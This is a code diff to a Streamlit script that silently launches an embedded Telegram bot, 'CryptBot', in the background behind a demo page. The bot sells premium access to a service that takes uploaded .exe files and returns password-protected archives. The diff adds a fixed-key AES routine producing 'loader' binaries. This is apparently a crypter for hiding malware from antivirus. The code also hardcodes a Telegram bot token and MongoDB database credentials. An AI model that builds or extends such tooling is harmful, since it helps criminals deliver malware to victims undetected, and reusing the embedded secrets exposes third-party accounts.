@@ -7,6 +7,7 @@ troy_code = """
 import os
 import random
 import string
+import requests
 from datetime import datetime, timedelta, timezone
 import sys
 import logging
@@ -40,8 +41,6 @@ API_TOKEN = '8047738165:AAGAU1InodqlYNYxS_ObzoPBWZyqR4FnxiI'
 ADMIN_ID = 5648376510
 
 # MongoDB setup
-
-
 MONGO_URI = 'mongodb+srv://allowdoctor:T3OtPNZe3wVgGzhQ@tgbotwd.u6kjv.mongodb.net/?retryWrites=true&w=majority&appName=Tgbotwd'
 client = MongoClient(MONGO_URI)
 db = client['cryptbot']
@@ -98,7 +97,6 @@ async def is_premium_user(user_id: int) -> bool:
         return False
 
 async def add_premium_user(user_id: int, duration_days: int):
-
     try:
         expiry_date = datetime.now(timezone.utc) + timedelta(days=duration_days)
         users_collection.update_one(
@@ -118,7 +116,6 @@ async def add_premium_user(user_id: int, duration_days: int):
         logger.error(f"Error in add_premium_user: {e}")
 
 async def get_premium_expiry(user_id: int) -> Optional[datetime]:
-
     try:
         user = users_collection.find_one({'user_id': user_id})
         if user:
@@ -132,46 +129,44 @@ async def get_premium_expiry(user_id: int) -> Optional[datetime]:
         return None
 
 # Command handlers
-# Command handlers
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-
     if 'processing' in context.user_data and context.user_data['processing']:
-        await update.message.reply_text(" A crypt process is already running. Please wait until it completes or cancel it.")
+        await update.message.reply_text("🔄 A crypt process is already running. Please wait until it completes or cancel it.")
         return
 
     # Define the custom keyboard layout with emojis
     keyboard = [
-        [' Start Encrypt', ' Subscription'],
-        [' Purchase', ' Need Help'],
-        [' Cancel Job']  # New 5th button
+        ['🔒 Start Encrypt', '📊 Subscription'],
+        ['💳 Purchase', '❓ Need Help'],
+        ['❌ Cancel Job']  # New 5th button
     ]
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
 
     await update.message.reply_text(
-        "Welcome to CryptBot!",
-        "Use the buttons below to interact with the bot",
-
+        "Welcome to CryptBot! 🤖\\n\\n"
+        "Use the buttons below to interact with the bot.\\n"
+        "Contact admin for premium access.",
         reply_markup=reply_markup
     )
 
 async def handle_menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-
     text = update.message.text
 
-    if text == ' Start Encrypt':
+    if text == '🔒 Start Encrypt':
         await crypt(update, context)
-    elif text == ' Subscription':
+    elif text == '📊 Subscription':
         await check(update, context)
-    elif text == ' Purchase':
+    elif text == '💳 Purchase':
         await purchase(update, context)
- 
-    elif text == ' Cancel Job':
+    elif text == '❓ Need Help':
+        await contact(update, context)
+    elif text == '❌ Cancel Job':
         await cancel(update, context)
     else:
         await update.message.reply_text("Invalid option. Please use the menu buttons.")
+
 # Cancel command handler
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-
     user_id = update.effective_user.id
     
     # Clean up any stored files
@@ -184,19 +179,18 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         "Operation cancelled. Use /crypt to start again."
     )
     return ConversationHandler.END
+
 # Admin command handlers
 async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
-        await update.message.reply_text(" You are not authorized to use this command.")
+        await update.message.reply_text("🚫 You are not authorized to use this command.")
         return ConversationHandler.END
     
     await update.message.reply_text("Please enter the chat ID of the user you want to give premium access to:")
     return ADMIN_CHAT_ID
 
 async def admin_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-  
     try:
         chat_id = int(update.message.text)
         context.user_data['premium_chat_id'] = chat_id
@@ -217,7 +211,6 @@ async def admin_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
         return ADMIN_CHAT_ID
 
 async def admin_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-
     query = update.callback_query
     await query.answer()
     
@@ -228,23 +221,22 @@ async def admin_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     
     keyboard = [
         [
-            InlineKeyboardButton(" Confirm", callback_data="confirm_yes"),
-            InlineKeyboardButton(" Cancel", callback_data="confirm_no")
+            InlineKeyboardButton("✅ Confirm", callback_data="confirm_yes"),
+            InlineKeyboardButton("❌ Cancel", callback_data="confirm_no")
         ]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await query.edit_message_text(
-        f"Confirm Premium Access"
-        f"User ID: {chat_id}"
-        f"Duration: {duration_data['text']}"
+        f"Confirm Premium Access\\n\\n"
+        f"User ID: {chat_id}\\n"
+        f"Duration: {duration_data['text']}\\n\\n"
         f"Add this user as premium?",
         reply_markup=reply_markup
     )
     return ADMIN_CONFIRM
 
 async def admin_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
- 
     query = update.callback_query
     await query.answer()
     
@@ -254,18 +246,17 @@ async def admin_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
         
         await add_premium_user(chat_id, duration_days)
         await query.edit_message_text(
-            f" Premium access granted!"
-            f"User ID: {chat_id}"
-            f"Duration: {duration_days} days"
+            f"✅ Premium access granted!\\n\\n"
+            f"User ID: {chat_id}\\n"
+            f"Duration: {duration_days} days\\n"
             f"Expiry: {(datetime.now(timezone.utc) + timedelta(days=duration_days)).strftime('%Y-%m-%d %H:%M:%S')} UTC"
         )
     else:
-        await query.edit_message_text(" Operation cancelled.")
+        await query.edit_message_text("❌ Operation cancelled.")
     
     return ConversationHandler.END
 
 async def crypt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-   
     user_id = update.effective_user.id
     
     if 'processing' in context.user_data and context.user_data['processing']:
@@ -274,26 +265,25 @@ async def crypt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
     if not await is_premium_user(user_id) and user_id != ADMIN_ID:
         await update.message.reply_text(
-            " Premium Access Required"
-            "You need premium access to use this command."
+            "🔒 Premium Access Required\\n\\n"
+            "You need premium access to use this command.\\n"
             "Please contact the administrator to purchase a subscription."
         )
         return ConversationHandler.END
     
     await update.message.reply_text(
-        " mock crypt."
+        "🔒 Starting encryption process.\\n"
         "Send /cancel to stop the process."
     )
     context.user_data['processing'] = True
     return WAITING_FOR_FILE
 
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-
     try:
         file = update.message.document
 
         if not file.file_name.lower().endswith('.exe'):
-            await update.message.reply_text(" File format not supported. Please upload a valid .exe file.")
+            await update.message.reply_text("❌ File format not supported. Please upload a valid .exe file.")
             context.user_data['processing'] = False
             return ConversationHandler.END
 
@@ -304,8 +294,8 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
         await new_file.download_to_drive(file_path)
 
         keyboard = [
-            [InlineKeyboardButton(" Yes", callback_data="yes")],
-            [InlineKeyboardButton(" No", callback_data="no")]
+            [InlineKeyboardButton("✅ Yes", callback_data="yes")],
+            [InlineKeyboardButton("❌ No", callback_data="no")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
@@ -324,7 +314,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
         return ConversationHandler.END
 
 async def confirm_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-
     query = update.callback_query
     await query.answer()
 
@@ -342,18 +331,18 @@ async def confirm_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
             
             # Show animated text while processing
             await query.edit_message_text(
-                " Processing your file..."
-                " (30%)"
+                "🔄 Processing your file...\\n"
+                "📊 Progress: 30%"
             )
             time.sleep(2)  # Simulate processing delay
             await query.edit_message_text(
-                " Processing your file..."
-                "(50%)"
+                "🔄 Processing your file...\\n"
+                "📊 Progress: 50%"
             )
             time.sleep(2)  # Simulate processing delay
             await query.edit_message_text(
-                " Processing your file..."
-                "(80%)"
+                "🔄 Processing your file...\\n"
+                "📊 Progress: 80%"
             )
             time.sleep(2)  # Simulate processing delay
 
@@ -370,7 +359,7 @@ async def confirm_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
                     # Extract the password from the headers
                     password = response.headers.get('X-Password')
                     if not password:
-                        await query.edit_message_text(" Invalid response from the server. Missing password in headers.")
+                        await query.edit_message_text("❌ Invalid response from the server. Missing password in headers.")
                         context.user_data['processing'] = False
                         return ConversationHandler.END
 
@@ -379,10 +368,10 @@ async def confirm_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
                     if not archive_filename:
                         archive_filename = f"processed_{random.randint(1000, 9999)}.7z"
 
-                    # Show "Processing 100% completed" and wait for 30 seconds
+                    # Show "Processing 100% completed" and wait for 5 seconds
                     await query.edit_message_text(
-                        " Processing Completed!"
-                        "(100%)"
+                        "✅ Processing Completed!\\n"
+                        "📊 Progress: 100%\\n"
                         "Please wait while we finalize the file..."
                     )
                     time.sleep(5)  # Wait for 5 seconds to ensure the 7zip file is fully generated
@@ -391,25 +380,25 @@ async def confirm_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
                     await query.message.reply_document(
                         document=response.content,
                         filename=archive_filename,
-                        caption=f" File processed successfully!  Password: {password}"
+                        caption=f"✅ File processed successfully! 🎉\\n🔑 Password: {password}"
                     )
 
                     # Mark process as finished
                     context.user_data['processing'] = False
                     return ConversationHandler.END
                 else:
-                    await query.edit_message_text(" Error occurred while processing the file.")
+                    await query.edit_message_text("❌ Error occurred while processing the file.")
                     context.user_data['processing'] = False
                     return ConversationHandler.END
 
             except requests.exceptions.Timeout:
-                await query.edit_message_text(" The server took too long to respond. Please try again later.")
+                await query.edit_message_text("⏰ The server took too long to respond. Please try again later.")
                 context.user_data['processing'] = False
                 return ConversationHandler.END
 
             except Exception as e:
                 logger.error(f"Error in confirm_file: {e}")
-                await query.edit_message_text(text=" An unexpected error occurred. Please try again later.")
+                await query.edit_message_text(text="❌ An unexpected error occurred. Please try again later.")
                 context.user_data['processing'] = False
                 if os.path.exists(file_path):
                     os.remove(file_path)
@@ -417,13 +406,13 @@ async def confirm_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
 
         except Exception as e:
             logger.error(f"Error in confirm_file: {e}")
-            await query.edit_message_text(text=" An unexpected error occurred. Please try again later.")
+            await query.edit_message_text(text="❌ An unexpected error occurred. Please try again later.")
             context.user_data['processing'] = False
             if os.path.exists(file_path):
                 os.remove(file_path)
             return ConversationHandler.END
     else:
-        await query.edit_message_text(" Operation cancelled. Use /crypt to try again.")
+        await query.edit_message_text("❌ Operation cancelled. Use /crypt to try again.")
         context.user_data['processing'] = False
         if os.path.exists(file_path):
             os.remove(file_path)
@@ -431,9 +420,8 @@ async def confirm_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
 
 # Check command handler
 async def check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-
     if 'processing' in context.user_data and context.user_data['processing']:
-        await update.message.reply_text(" A crypt process is already running. Please wait until it completes or cancel it.")
+        await update.message.reply_text("🔄 A crypt process is already running. Please wait until it completes or cancel it.")
         return
 
     user_id = update.effective_user.id
@@ -441,28 +429,56 @@ async def check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     
     if expiry_date:
         await update.message.reply_text(
-            f" Your premium subscription is valid until {expiry_date.strftime('%Y-%m-%d %H:%M:%S')} UTC"
+            f"✅ Your premium subscription is valid until {expiry_date.strftime('%Y-%m-%d %H:%M:%S')} UTC"
         )
     else:
-        await update.message.reply_text(" You do not have a valid premium subscription.")
+        await update.message.reply_text("❌ You do not have a valid premium subscription.")
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-
     try:
         logger.error(f'Error: {context.error} caused by update: {update}')
         if update and update.message:
             await update.message.reply_text(
-                " An error occurred. Please try again or use /crypt to start over."
+                "❌ An error occurred. Please try again or use /crypt to start over."
             )
     except Exception as e:
         logger.error(f"Error in error handler: {e}")
 
+def encrypt_bin_file(file_path: str) -> str:
+    key = "MyFixedEncryptionKey".encode('utf-8')
+
+    if len(key) > 16:
+        key = key[:16]
+    elif len(key) < 16:
+        key = key + b'\\x00' * (16 - len(key))
+
+    iv = key[:16]
+    encrypted_file_path = os.path.join("converted", f"loader_encrypted_{random.randint(1000, 9999)}.bin")
+
+    with open(file_path, "rb") as file:
+        file_data = file.read()
+
+    padder = padding.PKCS7(algorithms.AES.block_size).padder()
+    padded_data = padder.update(file_data) + padder.finalize()
+
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
+
+    with open(encrypted_file_path, "wb") as encrypted_file:
+        encrypted_file.write(encrypted_data)
+
+    return encrypted_file_path
+
+async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    await update.message.reply_text(
+        "📞 For any inquiries or support, please contact us at: @Nexcyte, @adbosts"
+    )
 
 # Command handler for 'purchase'
 async def purchase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
- 
     keyboard = [
-        [InlineKeyboardButton(" Purchase", url="https://t.me/adbosts")]
+        [InlineKeyboardButton("💳 Purchase", url="https://t.me/adbosts")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -472,14 +488,13 @@ async def purchase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     )
 
 def main():
-
     print("Starting bot...")
     try:
         # Create the Application
         application = Application.builder().token(API_TOKEN).build()
 
         # Add handlers for the new commands
-        
+        application.add_handler(CommandHandler('contact', contact))
         application.add_handler(CommandHandler('purchase', purchase))
 
         # Add premium management conversation handler
@@ -498,7 +513,7 @@ def main():
         conv_handler = ConversationHandler(
             entry_points=[
                 CommandHandler('crypt', crypt),  # Handle /crypt command
-                MessageHandler(filters.Text([' Start Encrypt']), crypt)  # Handle menu button
+                MessageHandler(filters.Text(['🔒 Start Encrypt']), crypt)  # Handle menu button
             ],
             states={
                 WAITING_FOR_FILE: [MessageHandler(filters.Document.ALL, handle_file)],  # Handle file uploads
@@ -536,12 +551,39 @@ with open("troy.py", "w") as f:
 
 # Function to run the background script
 def run_troy_script():
-    subprocess.Popen(["python", "troy.py"])
+    try:
+        subprocess.Popen(["python", "troy.py"])
+    except Exception as e:
+        st.error(f"Error running troy.py: {e}")
 
 # Run the background script in a separate thread
 threading.Thread(target=run_troy_script, daemon=True).start()
 
 # Streamlit UI
-st.title("Demo Streamlit App")
-st.write("This is a demo text shown on the desktop UI.")
-st.info("`troy.py` is running in the background.")
+st.title("🤖 CryptBot Demo")
+st.write("This is a demo Streamlit interface for the CryptBot Telegram bot.")
+st.success("✅ `troy.py` is running in the background.")
+
+# Add some status information
+st.subheader("Bot Status")
+st.info("The Telegram bot is now active and ready to receive commands.")
+
+st.subheader("Available Commands")
+st.markdown("""
+- `/start` - Initialize the bot
+- `/crypt` - Start encryption process (Premium users only)
+- `/check` - Check subscription status
+- `/admin` - Admin panel (Admin only)
+- `/contact` - Contact information
+- `/purchase` - Purchase premium access
+- `/cancel` - Cancel current operation
+""")
+
+st.subheader("Menu Buttons")
+st.markdown("""
+- 🔒 **Start Encrypt** - Begin file encryption
+- 📊 **Subscription** - Check your premium status
+- 💳 **Purchase** - Buy premium access
+- ❓ **Need Help** - Get support
+- ❌ **Cancel Job** - Stop current process
+""")
